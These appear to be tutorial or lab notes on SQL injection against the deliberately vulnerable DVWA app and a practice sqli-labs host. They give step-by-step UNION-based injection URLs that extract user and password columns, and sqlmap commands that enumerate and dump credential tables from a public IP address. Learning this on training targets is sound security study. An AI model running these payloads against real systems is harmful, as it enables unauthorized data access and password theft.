# SQL INJECTION
> ### SQL injection is the placement of malicious code in SQL statements, via web page input.
> 
> ### SQL injection comes is at top in the OWASP top 10 vulnerabilities list.


# SQL INJECTION DVWA - SECURITY LEVEL LOW
### Normal Request ->
> ### _ip_`/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#`
---
### Check for Exception Handling Validation ->
> ### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' `&Submit=Submit#`
```
If the website shows an SQL ERROR with the ' (single quote), then the application is vulnerable to SQL injection, else not.
```
---
### Check Total no. of columns in the table ->
> ### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' order by 1 --+`&Submit=Submit#`
> ### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' order by 1,2 --+`&Submit=Submit#`
> ### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' order by 1,2,3 --+`&Submit=Submit#`
```
If on error, then we can check for other columns by adding numbers after comma (in this case).

For the 3rd command, we get the error-> Unknown column '3' in 'order clause'

This means that there are only 2 columns in the table
```
---
### Now we have to extract the DDL (Data Definition Language) for the custom query execution
We start by ->
> ### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' union select 1,2 --+`&Submit=Submit#`
```
In place of 1,2 we can have all the data we want
```
> #### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' union select database(),version() --+`&Submit=Submit#`
```
This will give name of the database application is using and it's version
```
> #### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' union select 1,table_name from information_schema.tables --+`&Submit=Submit#`
```
We are asking information_schema to give us the name of all tables
Information Schema is responsible to index all the tables and columns in all the database.
```
> ##### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' union select 1,column_name from information_schema.columns where table_name=char(117, 115, 101, 114, 115)--+`&Submit=Submit#`
> 
> ##### _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' union select 1,column_name from information_schema.columns where table_name='users'--+`&Submit=Submit#`
```
The query may give error due to quotes and hence we can use the the char() function of SQL to pass the parameter in decimal.

This will give us list of all columns in the users table of the current database.

Here we are interested in `user` and `password` column.
```
---
### The whole query
> ####  _ip_`/dvwa/vulnerabilities/sqli/?id=1` ' union select user,password from users --+`&Submit=Submit#`
```
The above query will give away all the contents of `user` and `password` column.

You can crack the passwords using crackstation.
```


# SQLMAP
> ### SQLMAP will can automate the above process for us.

### But now we will use some different application->
> ### sqlmap -u http://54.91.48.13/sqli/Less-1/?id=1 --dbs
```
Target:

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")

Enumeration:

    --dbs               Enumerate DBMS databases

```
> ### sqlmap -u http://54.91.48.13/sqli/Less-1/?id=1 -D dvwa --tables
```
Enumeration:
    
    --tables            Enumerate DBMS database tables

    -D DB               DBMS database to enumerate

```
> ### sqlmap -u http://54.91.48.13/sqli/Less-1/?id=1 -D dvwa -T users --columns
```
Enumeration:

    --columns           Enumerate DBMS database table columns

    -T TBL              DBMS database table(s) to enumerate
```
> ### sqlmap -u http://54.91.48.13/sqli/Less-1/?id=1 -D dvwa -T users -C user,password --dump
```
Enumeration:
    
    --dump              Dump DBMS database table entries
    
    -C COL              DBMS database table column(s) to enumerate
```
> ## SQLMAP is smart to recognize passwords, the type of encryption used for them and will ask if you want to crack them. You can provide a wordlist for the same.
